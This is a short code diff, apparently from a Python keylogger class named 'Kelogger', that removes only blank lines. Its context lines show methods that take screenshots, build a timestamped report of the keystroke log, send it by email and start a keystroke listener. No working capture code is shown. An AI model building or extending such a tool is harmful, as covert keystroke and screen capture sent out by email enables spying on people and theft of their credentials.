@@ -50,7 +50,6 @@ class Kelogger:
             print(f"[!] Failed to take screenshot: {e}")
         return filename
 
-
   def report(self):
     if len(self.log) > 0:
       timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -107,7 +106,6 @@ class Kelogger:
 
       except Exception as e:
           print(f"[!] Failed to send email: {e}")
-
 
   def start(self):
       # Create a listener that monitors keystrokes
